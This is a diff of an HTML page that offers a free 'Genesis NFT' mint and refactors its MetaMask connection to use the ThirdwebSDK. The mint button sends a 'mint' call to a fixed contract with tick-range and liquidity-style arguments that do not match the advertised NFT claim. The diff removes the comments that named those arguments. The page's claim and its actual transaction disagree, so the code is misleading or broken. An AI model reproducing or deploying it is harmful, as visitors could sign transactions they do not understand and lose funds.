@@ -52,49 +52,51 @@
   <p>Claim your limited edition Genesis NFT. Only 500 ever. One per wallet. Free to mint.</p>
   <img src="https://ipfs.io/ipfs/bafybeihkmkaf2mgx7xkrnkhmzd2uvhr6ddgj6z3vkqcgnvlaa3z7x263r4" alt="Genesis NFT" />
   
-  <button id="connectBtn">Connect Wallet</button>
-  <button id="mintBtn">Mint NFT</button>
-  <p id="status"></p>
+<button id="connectBtn">Connect Wallet</button>
+<button id="mintBtn" disabled>Mint NFT</button>
+<p id="status"></p>
 
-  <script type="module">
-    import { ThirdwebSDK } from "https://cdn.skypack.dev/@thirdweb-dev/sdk";
-    import { ethers } from "https://cdn.skypack.dev/ethers";
+<script type="module">
+  import { ThirdwebSDK } from "https://cdn.skypack.dev/@thirdweb-dev/sdk";
 
-    let sdk, signer, address;
-    const contractAddress = "0xDA76d35742190283E340dbeE2038ecc978a56950";
+  let sdk, address;
+  const contractAddress = "0xDA76d35742190283E340dbeE2038ecc978a56950";
 
-    document.getElementById("connectBtn").onclick = async () => {
-      if (!window.ethereum) {
-        alert("Please install MetaMask.");
-        return;
-      }
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      signer = await provider.getSigner();
+  document.getElementById("connectBtn").onclick = async () => {
+    if (!window.ethereum) {
+      alert("Please install MetaMask.");
+      return;
+    }
+
+    try {
+      sdk = new ThirdwebSDK(window.ethereum);
+      const signer = await sdk.getSigner();
       address = await signer.getAddress();
-      sdk = new ThirdwebSDK(signer);
       document.getElementById("status").innerText = "Connected: " + address;
-    };
+      document.getElementById("mintBtn").disabled = false;
+    } catch (err) {
+      document.getElementById("status").innerText = "Connection failed: " + err.message;
+    }
+  };
 
-    document.getElementById("mintBtn").onclick = async () => {
-      if (!sdk || !address) {
-        alert("Please connect your wallet first.");
-        return;
-      }
+  document.getElementById("mintBtn").onclick = async () => {
+    if (!sdk || !address) {
+      alert("Please connect your wallet first.");
+      return;
+    }
 
-      try {
-        const contract = await sdk.getContract(contractAddress);
-        const tx = await contract.call("mint", [
-          address,         // to
-          -887220,         // tickLower
-          887220,          // tickUpper
-          1,               // amount
-          "0x"             // data
-        ]);
-        document.getElementById("status").innerText = "Minted successfully!";
-      } catch (err) {
-        document.getElementById("status").innerText = "Mint failed: " + err.message;
-      }
-    };
-  </script>
-</body>
-</html>
+    try {
+      const contract = await sdk.getContract(contractAddress);
+      const tx = await contract.call("mint", [
+        address,
+        -887220,
+        887220,
+        1,
+        "0x"
+      ]);
+      document.getElementById("status").innerText = "Minted successfully!";
+    } catch (err) {
+      document.getElementById("status").innerText = "Mint failed: " + err.message;
+    }
+  };
+</script>
